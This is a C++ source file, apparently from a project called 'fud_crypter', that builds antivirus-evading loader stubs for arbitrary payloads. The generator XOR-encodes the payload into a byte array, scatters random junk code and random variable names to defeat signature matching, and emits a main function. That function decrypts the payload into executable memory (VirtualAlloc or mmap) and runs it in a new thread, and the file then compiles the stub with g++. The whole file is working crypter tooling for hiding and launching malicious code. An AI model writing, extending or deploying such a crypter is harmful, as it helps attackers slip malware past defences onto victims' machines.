#include "fud_crypter/builder/polymorph.hpp"
#include <random>
#include <sstream>
#include <ctime>
#include <cstdlib>
#include <fstream>
#include <iostream>

#ifdef FUD_PLATFORM_WINDOWS
#include <windows.h>
#else
#include <unistd.h>
#endif

namespace fud_crypter {

    std::vector<uint8_t> PolymorphGenerator::generate_stub(
        const std::vector<uint8_t>& payload,
        const std::vector<uint8_t>& key,
        bool randomize
    ) {
        std::stringstream code;

        code << R"(#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <pthread.h>
#include <unistd.h>
#endif
#include <vector>
#include <cstring>
#include <cstdint>

)";

if (randomize) {
    auto var_payload = random_var_name();
    auto var_key     = random_var_name();
    auto var_size    = random_var_name();
    auto var_ptr     = random_var_name();
    auto var_thread  = random_var_name();

    code << "static unsigned char " << var_payload << "[] = {";
    for (size_t i = 0; i < payload.size(); ++i) {
        code << "0x" << std::hex << (int)payload[i];
        if (i + 1 < payload.size()) code << ",";
    }
    code << "};\n";

    code << "static unsigned char " << var_key << "[] = {";
    for (size_t i = 0; i < key.size(); ++i) {
        code << "0x" << std::hex << (int)key[i];
        if (i + 1 < key.size()) code << ",";
    }
    code << "};\n";

    code << "static const size_t " << var_size << " = sizeof(" << var_payload << ");\n";

    code << "\n// ----- junk code -----\n";
    code << generate_junk_code(8 + (std::rand() % 12));
    code << "// --------------------\n\n";

    code << R"(
int main() {
    // XOR dekódolás
    for (size_t i = 0; i < )" << var_size << R"(; ++i) {
        )" << var_payload << R"([i] ^= )" << var_key << R"([i % sizeof()" << var_key << R"()]);
    }

#ifdef _WIN32
    void* )" << var_ptr << R"( = VirtualAlloc(NULL, )" << var_size << R"(, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!)" << var_ptr << R"() return 1;
    memcpy()" << var_ptr << R"(, )" << var_payload << R"(, )" << var_size << R"();
    HANDLE )" << var_thread << R"( = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE))" << var_ptr << R"(, NULL, 0, NULL);
    if ()" << var_thread << R"() WaitForSingleObject()" << var_thread << R"(, INFINITE);
#else
    void* )" << var_ptr << R"( = mmap(NULL, )" << var_size << R"(, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if ()" << var_ptr << R"( == MAP_FAILED) return 1;
    memcpy()" << var_ptr << R"(, )" << var_payload << R"(, )" << var_size << R"();
    pthread_t )" << var_thread << R"(;
    pthread_create(&)" << var_thread << R"(, NULL, (void*(*)(void*))" << var_ptr << R"(, NULL);
    pthread_join()" << var_thread << R"(, NULL);
    #endif

    return 0;
}
    )";

} else {
    code << R"(
int main() {
    return 0;
}
    )";
}

std::string src = code.str();
return std::vector<uint8_t>(src.begin(), src.end());
    }

    std::string PolymorphGenerator::generate_junk_code(int lines) {
        static const char* templates[] = {
            "int _ = 0;",
            "volatile int x = 0;",
            "for (int i=0; i<10; ++i) { int t = i; }",
                   "char buf[128] = {0};",
                   "if (false) { return 0; }",
                   "int a = 1, b = 2, c = a + b;",
                   "void* ptr = malloc(64); free(ptr);",
                   "static int dummy = 42;",
                   "long long n = 123456789;",
                   "double d = 3.14159;",
                   "volatile unsigned int counter = 0;",
                   "for (int j=0; j<5; ++j) { counter += j; }",
                   "if (sizeof(void*) == 8) { int _ = 0; }",
                   "char dummy_str[] = \"junk\";",
                   "int arr[10] = {0};"
        };
        const int n = sizeof(templates) / sizeof(templates[0]);

        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, n - 1);

        std::stringstream ss;
        for (int i = 0; i < lines; ++i) {
            ss << "    " << templates[dis(gen)] << "\n";
        }
        return ss.str();
    }

    std::string PolymorphGenerator::random_var_name() {
        static const char* chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> len_dis(5, 14);
        std::uniform_int_distribution<> char_dis(0, 51);

        int len = len_dis(gen);
        std::string name;
        name.reserve(len);
        for (int i = 0; i < len; ++i) {
            name += chars[char_dis(gen)];
        }
        return name;
    }

    std::vector<uint8_t> PolymorphGenerator::random_key(size_t size) {
        std::vector<uint8_t> key(size);
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        for (size_t i = 0; i < size; ++i) {
            key[i] = static_cast<uint8_t>(dis(gen));
        }
        return key;
    }

    bool PolymorphGenerator::compile_stub(const std::string& source_path, const std::string& output_exe) {
        std::string cmd;
        #ifdef FUD_PLATFORM_WINDOWS
        cmd = "g++ -std=c++17 -O2 -Wall -Wextra -o \"" + output_exe + "\" \"" + source_path + "\" -ladvapi32";
        #else
        cmd = "g++ -std=c++17 -O2 -Wall -Wextra -o \"" + output_exe + "\" \"" + source_path + "\" -lpthread";
        #endif
        std::cout << "[*] Compiling: " << cmd << std::endl;
        int ret = std::system(cmd.c_str());
        if (ret != 0) {
            std::cerr << "[ERROR] Compilation failed with code " << ret << "\n";
            return false;
        }
        return true;
    }

    bool PolymorphGenerator::save_stub_source(const std::string& path, const std::vector<uint8_t>& source) {
        std::ofstream file(path, std::ios::binary | std::ios::trunc);
        if (!file) return false;
        file.write(reinterpret_cast<const char*>(source.data()), source.size());
        return true;
    }

} // namespace fud_crypter
